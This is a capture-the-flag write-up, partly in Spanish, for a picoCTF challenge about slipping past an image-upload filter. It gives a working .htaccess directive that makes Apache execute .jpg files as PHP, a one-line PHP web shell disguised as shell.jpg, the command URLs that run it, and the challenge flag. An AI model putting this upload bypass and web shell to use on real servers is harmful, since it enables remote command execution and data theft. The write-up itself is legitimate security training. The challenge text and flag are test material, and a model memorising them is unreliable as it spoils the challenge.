A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.

Additional details will be available after launching your challenge instance.

Hints:
- Apache can be tricked into executing non-PHP files as PHP with a `.htaccess` file.
- Try uploading more than just one file.


## Solucion

### **The Plan**

1. **Create a `.htaccess` file**: This file will contain a directive to make Apache execute `.jpg` files as PHP.
2. **Create a webshell**: This is a PHP script that will be disguised as a JPG image.
3. **Upload both files.**
4. **Access the webshell** and get the flag.

```
cat .htaccess
AddType application/x-httpd-php .jpg


 cat shell.jpg
<?php
    system($_GET['cmd']);
?>
```

- subimos ambos
- buscamos flag
```
http://amiable-citadel.picoctf.net:55906/images/shell.jpg?cmd=ls
http://amiable-citadel.picoctf.net:55906/images/shell.jpg?cmd=cat%20../../flag.txt
picoCTF{s3rv3r_byp4ss_20193d1e}
```